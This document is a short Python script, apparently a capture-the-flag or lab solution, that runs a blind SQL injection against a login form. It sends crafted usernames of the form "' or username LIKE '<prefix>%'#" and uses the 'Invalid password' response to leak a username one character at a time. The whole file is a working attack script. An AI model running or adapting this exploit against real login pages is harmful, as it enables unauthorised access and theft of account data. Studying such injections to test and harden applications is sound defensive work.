#!/usr/bin/env python
import requests 
import string
# username
url = 'http://66344a5554test.com/66344a5554/login'
leake_data = list('')
while len(leake_data)<=10:
    for characters in string.printable:
        dd = ''.join(leake_data)
        t   = requests.post(
        url,
        data ={'username': '\' or username LIKE \'{}{}%\'#'.format(dd,characters), 'password': 'aaa'}   
        )  
        print(''.join(leake_data)+characters) 
        if 'Invalid password' in t.text:
            leake_data.append(characters)
            break
